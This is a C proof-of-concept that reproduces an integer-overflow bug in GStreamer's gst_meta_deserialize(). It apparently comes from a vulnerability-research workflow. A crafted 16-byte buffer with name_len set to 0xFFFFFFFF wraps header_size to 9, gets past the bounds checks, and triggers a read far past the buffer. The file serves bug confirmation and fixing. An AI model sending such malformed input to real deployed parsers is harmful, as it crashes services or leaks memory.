/*
 * Standalone reproduction for the gst_meta_deserialize() header_size overflow
 * (candidate 022, findings.toml OVF_8).
 *
 * Calls the real public API gst_meta_deserialize() (subprojects/gstreamer/gst/gstmeta.c) with a
 * 16-byte crafted serialization buffer, exactly the way any real caller deserializing untrusted
 * meta data (e.g. gdpdepay, unixfdsrc, anything reading gst_meta_serialize()'s wire format from a
 * network/IPC peer or a file) would call it. No internals of gst_meta_deserialize() are faked -
 * this is a malformed external artifact handed to the parser's own real entry point, the same
 * bytes a real attacker/misbehaving peer would supply (see CONFIRMATION.md section 11: no second
 * participant needs to be faked here, there's no "other side" being impersonated).
 *
 * Format expected by gst_meta_deserialize(): [total_size u32-le][name_len u32-le][name]['\0']
 * [version u8][payload].
 *
 * header_size is computed as `2*sizeof(guint32) + name_len + 2` where name_len is read directly
 * from the untrusted buffer (data+4) and can be up to G_MAXUINT32. The declared type of
 * header_size is guint32, so the computed 64-bit sum silently truncates on assignment:
 *   name_len == 0xFFFFFFFF -> 8 + 0xFFFFFFFF + 2 = 0x100000009 -> truncated to 9
 * That tiny wrapped header_size then passes both `size < total_size` and
 * `total_size < header_size` bounds checks for a small, otherwise-valid-looking total_size, and
 * execution reaches `name[name_len] != '\0'` - a read at up to ~4GB past the actual buffer.
 */
#include <gst/gst.h>
#include <stdio.h>
#include <string.h>

int
main (int argc, char **argv)
{
  gst_init (NULL, NULL);

  guint8 data[16];
  memset (data, 0, sizeof (data));

  GST_WRITE_UINT32_LE (data + 0, 16);           /* total_size */
  GST_WRITE_UINT32_LE (data + 4, G_MAXUINT32);   /* name_len (attacker controlled) */
  /* data[8..15]: name bytes / version / payload - contents irrelevant, never reached safely */

  GstBuffer *buffer = gst_buffer_new ();
  guint32 consumed = 0;

  fprintf (stderr, "Calling gst_meta_deserialize() with %zu-byte buffer, "
      "total_size=16, name_len=0x%x ...\n", sizeof (data), G_MAXUINT32);
  fflush (stderr);

  GstMeta *meta = gst_meta_deserialize (buffer, data, sizeof (data), &consumed);

  /* Only reached on a fixed build - the buggy one crashes inside the call above. */
  fprintf (stderr, "Returned without crashing: meta=%p consumed=%u\n",
      (void *) meta, consumed);

  gst_buffer_unref (buffer);
  return 0;
}
